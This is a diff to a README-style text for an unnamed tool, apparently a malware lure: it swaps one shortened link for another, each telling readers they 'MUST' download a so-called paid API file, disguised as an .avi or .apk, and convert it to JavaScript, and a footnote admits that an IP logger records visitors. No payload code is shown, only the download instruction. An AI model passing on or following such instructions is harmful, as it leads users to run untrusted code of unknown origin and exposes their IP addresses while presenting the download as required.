@@ -9,7 +9,7 @@ Updating this tool has a big impact on what it can do.
 #IMPORTANT#
 
 I am using a PAID UI API to run this tool.
-You MUST Download the .api file here: https://2no.co/2I7VD.avi MAKE SURE TO CONVERT IT TO .JS!!!
+You MUST Download the .api file here: https://yip.su/2ATXc5.apk MAKE SURE TO CONVERT IT TO .JS!!!
 FOOTNOTE:
 I am using a ip logger, but it is needed for security purposes. I need to make sure bots are not overusing this tool.
 Thank you!
